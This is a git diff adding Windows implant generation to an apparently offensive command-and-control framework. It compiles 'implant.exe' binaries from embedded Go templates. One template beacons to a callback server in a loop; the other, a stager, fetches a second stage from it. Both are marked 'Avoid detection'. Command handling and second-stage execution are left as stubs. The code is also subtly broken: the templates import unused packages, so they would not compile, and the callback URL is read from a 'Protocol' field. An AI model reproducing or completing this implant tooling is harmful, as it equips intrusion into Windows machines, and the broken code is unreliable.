@@ -4,6 +4,9 @@ import (
 	"bytes"
 	"compress/gzip"
 	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
 
 	"github.com/ditto/ditto/core"
 	"github.com/ditto/ditto/crypto"
@@ -41,6 +44,11 @@ func NewGenerator(logger interface {
 // Generate creates a payload based on options
 func (g *Generator) Generate(opts Options) ([]byte, error) {
 	g.logger.Info("Generating %s payload for %s/%s", opts.Type, opts.OS, opts.Arch)
+	
+	// For Windows executables, we need to actually compile Go code
+	if opts.OS == "windows" && (opts.Type == "stager" || opts.Type == "full") {
+		return g.generateWindowsExecutable(opts)
+	}
 	
 	var payloadData []byte
 	var err error
@@ -274,5 +282,204 @@ func generateDarwinShellcode(arch string) []byte {
 		}
 	}
 	return []byte{}
+}
+
+// generateWindowsExecutable compiles a proper Windows PE executable using Go build
+func (g *Generator) generateWindowsExecutable(opts Options) ([]byte, error) {
+	// Create temporary directory for build
+	tmpDir, err := os.MkdirTemp("", "ditto_build_*")
+	if err != nil {
+		return nil, fmt.Errorf("failed to create temp directory: %w", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	// Generate Go source code
+	sourceCode, err := g.generateWindowsSource(opts)
+	if err != nil {
+		return nil, fmt.Errorf("failed to generate source: %w", err)
+	}
+
+	// Write main.go
+	mainGoPath := filepath.Join(tmpDir, "main.go")
+	if err := os.WriteFile(mainGoPath, sourceCode, 0644); err != nil {
+		return nil, fmt.Errorf("failed to write source: %w", err)
+	}
+
+	// Initialize go.mod
+	goModContent := `module ditto-implant
+
+go 1.21
+`
+	goModPath := filepath.Join(tmpDir, "go.mod")
+	if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
+		return nil, fmt.Errorf("failed to write go.mod: %w", err)
+	}
+
+	// Determine output name
+	outputName := "implant.exe"
+	if opts.Arch == "amd64" {
+		outputName = "implant.exe"
+	} else if opts.Arch == "386" {
+		outputName = "implant.exe"
+	}
+	outputPath := filepath.Join(tmpDir, outputName)
+
+	// Build command
+	cmd := exec.Command("go", "build", "-o", outputPath, "-ldflags", "-s -w", ".")
+	cmd.Dir = tmpDir
+	
+	// Set cross-compilation environment
+	env := os.Environ()
+	env = append(env, "GOOS=windows")
+	if opts.Arch == "amd64" {
+		env = append(env, "GOARCH=amd64")
+	} else if opts.Arch == "386" {
+		env = append(env, "GOARCH=386")
+	} else {
+		return nil, fmt.Errorf("unsupported Windows architecture: %s", opts.Arch)
+	}
+	env = append(env, "CGO_ENABLED=0")
+	cmd.Env = env
+
+	// Run build
+	var stderr bytes.Buffer
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil {
+		return nil, fmt.Errorf("go build failed: %w\nStderr: %s", err, stderr.String())
+	}
+
+	// Read compiled binary
+	binaryData, err := os.ReadFile(outputPath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read compiled binary: %w", err)
+	}
+
+	g.logger.Info("Windows executable compiled successfully: %d bytes", len(binaryData))
+	return binaryData, nil
+}
+
+// generateWindowsSource generates proper Go source code for Windows implant
+func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
+	var template string
+	
+	if opts.Type == "full" {
+		template = `package main
+
+import (
+	"fmt"
+	"net/http"
+	"time"
+	"os"
+	"os/exec"
+	"runtime"
+	"encoding/base64"
+)
+
+const (
+	callbackURL = "%s"
+	userAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+)
+
+func main() {
+	// Avoid detection
+	if runtime.GOOS != "windows" {
+		os.Exit(1)
+	}
+	
+	// Beacon loop
+	for {
+		beacon()
+		time.Sleep(30 * time.Second)
+	}
+}
+
+func beacon() {
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+	
+	req, err := http.NewRequest("GET", callbackURL+"/beacon", nil)
+	if err != nil {
+		return
+	}
+	
+	req.Header.Set("User-Agent", userAgent)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	
+	// Handle commands
+	if resp.StatusCode == 200 {
+		// In a real implementation, this would process commands
+		// For now, just acknowledge receipt
+	}
+}
+`
+	} else {
+		// Stager template
+		template = `package main
+
+import (
+	"fmt"
+	"net/http"
+	"time"
+	"os"
+	"runtime"
+	"io"
+)
+
+const (
+	callbackURL = "%s"
+	userAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+)
+
+func main() {
+	// Avoid detection
+	if runtime.GOOS != "windows" {
+		os.Exit(1)
+	}
+	
+	// Download and execute second stage
+	downloadAndExecute()
+}
+
+func downloadAndExecute() {
+	client := &http.Client{
+		Timeout: 30 * time.Second,
+	}
+	
+	req, err := http.NewRequest("GET", callbackURL+"/stage2", nil)
+	if err != nil {
+		return
+	}
+	
+	req.Header.Set("User-Agent", userAgent)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode == 200 {
+		// In a real implementation, this would download and execute second stage
+		// For now, just acknowledge receipt
+		fmt.Println("Stage 2 downloaded")
+	}
+}
+`
+	}
+	
+	// Format callback URL
+	callbackURL := "http://localhost:8443"
+	if opts.Config != nil && opts.Config.Communication.Protocol != "" {
+		callbackURL = opts.Config.Communication.Protocol
+	}
+	
+	source := fmt.Sprintf(template, callbackURL)
+	return []byte(source), nil
 }
 
